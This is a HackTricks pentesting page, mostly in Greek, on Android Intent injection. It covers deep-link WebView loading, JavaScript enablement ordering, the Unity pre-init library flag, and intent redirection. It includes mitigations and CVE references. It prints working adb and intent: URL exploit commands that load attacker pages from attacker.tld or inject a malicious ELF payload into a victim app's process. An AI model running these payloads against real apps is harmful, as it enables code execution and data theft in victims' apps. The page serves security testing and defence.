# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Το Intent Injection εκμεταλλεύεται components που δέχονται attacker-controlled Intents ή δεδομένα που αργότερα μετατρέπονται σε Intents. Δύο πολύ κοινά μοτίβα κατά τη διάρκεια Android app pentests είναι:

- Μετάδοση crafted extras σε exported Activities/Services/BroadcastReceivers που στη συνέχεια προωθούνται σε privileged, non-exported components.
- Πρόκληση exported VIEW/BROWSABLE deep links που προωθούν attacker-controlled URLs σε internal WebViews ή άλλες ευαίσθητες sinks.

## Deep links → WebView sink (URL parameter injection)

Εάν μια εφαρμογή εκθέτει ένα custom scheme deep link όπως:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
και η Activity που δέχεται προωθεί την παράμετρο ερωτήματος `url` σε ένα WebView, μπορείτε να αναγκάσετε την εφαρμογή να αποδώσει αυθαίρετο απομακρυσμένο περιεχόμενο στο δικό της περιβάλλον WebView.

PoC μέσω adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact
- HTML/JS εκτελείται μέσα στο προφίλ WebView της εφαρμογής.
- If JavaScript is enabled (by default or due to misordered checks), you can enumerate/use any exposed `@JavascriptInterface` objects, steal WebView cookies/local storage, and pivot.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Order-of-checks bug enabling JavaScript

Ένα επαναλαμβανόμενο σφάλμα είναι η ενεργοποίηση του JavaScript (ή άλλων επιτρεπτικών ρυθμίσεων WebView) πριν ολοκληρωθεί η τελική URL allowlist/επαλήθευση. Αν πρώιμοι helpers αποδεχθούν το deep link σας και το WebView διαμορφωθεί πρώτα, το τελικό load γίνεται με το JavaScript ήδη ενεργό ακόμα κι αν οι μεταγενέστεροι έλεγχοι είναι ελαττωματικοί ή πολύ αργοί.

What to look for in decompiled code:
- Πολλαπλοί helpers που parse/split/rebuild το URL με διαφορετικό τρόπο (μη συνεπής normalization).
- Calls to `getSettings().setJavaScriptEnabled(true)` before the last host/path allowlist check.
- A pipeline like: parse → partial validate → configure WebView → final verify → loadUrl.

Mitigations
- Κανονικοποιήστε μία φορά και επαληθεύστε αυστηρά — fail closed.
- Only enable JavaScript after all checks pass and just before loading trusted content.
- Αποφύγετε την έκθεση bridges σε μη αξιόπιστες origins.

## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Unity-based Android apps typically use `com.unity3d.player.UnityPlayerActivity` (or `UnityPlayerGameActivity`) as the entry Activity. Unity’s Android template treats a special Intent extra named `unity` as a string of command-line flags for the Unity runtime. When the entry Activity is exported (default in many templates), any local app – and sometimes a website if `BROWSABLE` is present – can supply this extra.

A dangerous, undocumented flag leads to native code execution during very early process initialization:

- Κρυφό flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` very early in init, loading attacker-controlled ELF inside the target app’s process with its UID and permissions.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Why it works
- Το Intent extra `unity` αναλύεται σε Unity runtime flags.
- Η παροχή του pre-init flag κατευθύνει την Unity σε έναν attacker-controlled ELF path εντός ενός επιτρεπτού linker namespace path (βλ. περιορισμούς παρακάτω).

Conditions for exploitation
- Η Unity entry Activity είναι exported (συνήθως true από προεπιλογή).
- Για one-click remote μέσω browser: η entry Activity δηλώνει επίσης `android.intent.category.BROWSABLE` ώστε extras να μπορούν να περαστούν από ένα `intent:` URL.

Local exploitation (same device)
1) Τοποθετήστε ένα payload ELF σε ένα path που μπορεί να διαβάσει το victim app. Ευκολότερο: συμπεριλάβετε μια malicious library στην attacker app σας και βεβαιωθείτε ότι εξάγεται κάτω από `/data/app/.../lib/<abi>/` ρυθμίζοντας στο attacker’s manifest:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Εκκινήστε το Unity activity του θύματος με το CLI pre-init flag στο extra `unity`. Παράδειγμα ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; το payload σου τρέχει στη διεργασία του θύματος, κληρονομώντας όλες τις άδειες της εφαρμογής (camera/mic/network/storage, κ.λπ.) και πρόσβαση σε in-app sessions/data.

Σημειώσεις
- Η ακριβής `/data/app/...` διαδρομή διαφέρει ανά συσκευή/εγκατάσταση. Μια attacker app μπορεί να ανακτήσει τον δικό της native lib dir κατά το runtime μέσω `getApplicationInfo().nativeLibraryDir` και να τον μεταδώσει στο trigger.
- Το αρχείο δεν χρειάζεται να τελειώνει με `.so` εάν είναι έγκυρο ELF – `dlopen()` κοιτάει τα ELF headers, όχι τις επεκτάσεις.

Απομακρυσμένο one‑click μέσω browser (υπό προϋποθέσεις)
Εάν η Unity entry activity είναι exported με `BROWSABLE`, ένας ιστότοπος μπορεί να περάσει extras μέσω ενός `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Ωστόσο, σε σύγχρονο Android, οι dynamic linker namespaces και το SELinux εμποδίζουν τη φόρτωση από πολλές δημόσιες διαδρομές (π.χ., `/sdcard/Download`). Θα δείτε σφάλματα όπως:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Στρατηγική παράκαμψης: στοχεύστε εφαρμογές που cache-άρουν attacker-controlled bytes στο private storage τους (π.χ. HTTP caches). Δεδομένου ότι τα επιτρεπόμενα paths περιλαμβάνουν το `/data` και τον private dir της εφαρμογής, η στόχευση του `-xrsdk-pre-init-library` σε ένα απόλυτο path μέσα στο cache της εφαρμογής μπορεί να ικανοποιήσει linker constraints και να αποφέρει code execution. Αυτό αντανακλά προηγούμενα cache-to-ELF RCE patterns που παρατηρήθηκαν σε άλλες Android apps.


## Άλλες κλασικές Intent injection primitives

- startActivity/sendBroadcast χρησιμοποιώντας attacker-supplied `Intent` extras που αργότερα επανα-αναλύονται (`Intent.parseUri(...)`) και εκτελούνται.
- Exported proxy components που προωθούν Intents σε non-exported sensitive components χωρίς permission checks.

---

## Αυτοματοποίηση exported-component testing (Smali-driven ADB generation)

Όταν exported components αναμένουν συγκεκριμένα extras, το τυφλό μάντεμα του σχήματος payload προκαλεί σπατάλη χρόνου και false negatives. Μπορείτε να αυτοματοποιήσετε την ανακάλυψη των keys/types απευθείας από Smali και να δημιουργήσετε έτοιμες προς εκτέλεση adb εντολές.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: decompile και σαρώστε το Smali για κλήσεις όπως `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` για να συμπεράνετε ποια extras και πεδία καταναλώνονται από κάθε component.
- Output: για κάθε exported Activity/Service/Receiver/Provider, το εργαλείο εκτυπώνει μια σύντομη εξήγηση και την ακριβή `adb shell am ...`/`cmd content ...` εντολή με σωστά typed flags.

Εγκατάσταση
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Χρήση
```bash
python apk-components-inspector.py target.apk
```
Παράδειγμα εξόδου
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras cheat sheet (type-aware flags)
- Συμβολοσειρές: `--es key value` | Πίνακας συμβολοσειρών: `--esa key v1,v2`
- Ακέραιοι: `--ei key 123` | Πίνακας ακεραίων: `--eia key 1,2,3`
- Booleans: `--ez key true|false`
- Longs: `--el key 1234567890`
- Floats: `--ef key 1.23`
- URIs (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Component extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Συνήθη flags: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro tips για Providers
- Χρησιμοποιήστε `adb shell cmd content query|insert|update|delete ...` για να προσπελάσετε ContentProviders χωρίς agents.
- Για SQLi probing, διαφοροποιήστε `--projection` και `--where` (aka selection) όταν ο υποκείμενος provider είναι SQLite-backed.

Πλήρης αυτοματοποίηση pipeline (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
Βοηθητικό script (συνενώνει συνεχόμενες γραμμές, εκτελεί μόνο τις γραμμές που ξεκινούν με `adb`):
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
Run on-device: the inspector is Python-based and works in Termux or rooted phones where `apktool`/`androguard` are available.

---

## Intent Redirection (CWE-926) – finding and exploiting

Pattern
- Ένα exported entry point (Activity/Service/Receiver) διαβάζει ένα εισερχόμενο Intent και το προωθεί εσωτερικά ή εξωτερικά χωρίς να επικυρώνει την προέλευση/τα δεδομένα, π.χ.:
- `startActivity(getIntent())`
- `startActivity(intent)` όπου το `intent` προήλθε από ένα extra όπως `redirect_intent`/`next_intent`/`pending_intent` ή `Intent.parseUri(...)`.
- Εμπιστοσύνη στα πεδία `action`/`data`/`component` χωρίς ελέγχους· μη επαλήθευση της ταυτότητας του caller.

What to search in Smali/Java
- Χρήσεις του `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Άμεσες κλήσεις `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` σε Intents που έχουν επηρεαστεί από attacker.
- Έλλειψη ελέγχων `getCallingPackage()`/`getCallingActivity()` ή προσαρμοσμένων μηχανισμών αδειών.

ADB PoC templates
- Proxy Activity που προωθεί ένα extra Intent σε μια εσωτερική Activity με προνόμια:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Εξαγόμενη υπηρεσία που υποστηρίζει ένα parcelable `redirect_intent`:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver που προωθεί χωρίς επικύρωση:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Σημαίες που βοηθούν σε συμπεριφορά τύπου singleTask
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Πραγματικά παραδείγματα (ο αντίκτυπος ποικίλλει):
- CVE-2024-26131 (Element Android): exported flows που οδηγούν σε WebView manipulation, PIN bypass, login hijack.
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → επιπτώσεις σε επίπεδο συστήματος.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): ανακατεύθυνση → arbitrary file access (w/ user interaction).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).

Μέτρα μετριασμού (λίστα ελέγχου για προγραμματιστές)
- Μην προωθείτε απευθείας τα εισερχόμενα Intents· sanitize και ανακατασκευάστε τα επιτρεπτά πεδία.
- Περιορίστε την έκθεση με `android:exported="false"` εκτός εάν είναι απαραίτητο. Protect exported components με permissions και signatures.
- Επαληθεύστε την ταυτότητα του caller (`getCallingPackage()`/`getCallingActivity()`), και επιβάλετε explicit Intents για intra-app navigation.
- Επικυρώστε τόσο το `action` όσο και το `data` (scheme/host/path) πριν τη χρήση· αποφύγετε το `Intent.parseUri` σε μη αξιόπιστη είσοδο.

---

## Αναφορές

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)

{{#include ../../banners/hacktricks-training.md}}
